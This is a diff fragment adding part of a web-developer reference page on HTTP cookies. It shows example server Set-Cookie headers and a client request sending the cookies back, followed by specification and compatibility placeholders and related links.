+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb16-1" title="1"><span class="ex">HTTP/1.0</span> 200 OK</a>
+<a class="sourceLine" id="cb16-2" title="2"><span class="ex">Content-type</span>: text/html</a>
+<a class="sourceLine" id="cb16-3" title="3"><span class="ex">Set-Cookie</span>: cookie_name1=cookie_value1</a>
+<a class="sourceLine" id="cb16-4" title="4"><span class="ex">Set-Cookie</span>: cookie_name2=cookie_value2<span class="kw">;</span> <span class="va">expires=</span>Sun, <span class="ex">16</span> Jul 3567 06:23:41 GMT</a>
+<a class="sourceLine" id="cb16-5" title="5"></a>
+<a class="sourceLine" id="cb16-6" title="6">[<span class="ex">content</span> of the page here]</a></code></pre></div>
+<h4 id="the-client-sends-back-to-the-server-its-cookies-previously-stored">The client sends back to the server its cookies previously stored</h4>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb17-1" title="1"><span class="ex">GET</span> /sample_page.html HTTP/1.1</a>
+<a class="sourceLine" id="cb17-2" title="2"><span class="ex">Host</span>: www.example.org</a>
+<a class="sourceLine" id="cb17-3" title="3"><span class="ex">Cookie</span>: cookie_name1=cookie_value1<span class="kw">;</span> <span class="va">cookie_name2=</span>cookie_value2</a>
+<a class="sourceLine" id="cb17-4" title="4"><span class="ex">Accept</span>: */*</a></code></pre></div>
+<h2 id="specifications">Specifications</h2>
+<p>{{Specifications}}</p>
+<h2 id="browser-compatibility">Browser compatibility</h2>
+<p>{{Compat}}</p>
+<h2 id="see-also">See also</h2>
+<ul>
+<li><a href="/en-US/docs/Web/HTTP/Cookies">HTTP cookies</a></li>
+<li><a href="/en-US/docs/Web/API/Web_Storage_API">DOM Storage</a></li>
+<li><a href="/en-US/docs/Web/API/URL/pathname"><code>URL.pathname</code></a></li>
+<li>{{jsxref(“Date.toUTCString()”)}}</li>
+<li><a href="https://datatracker.ietf.org/doc/html/rfc2965">RFC 2965</a></li>
+</ul>
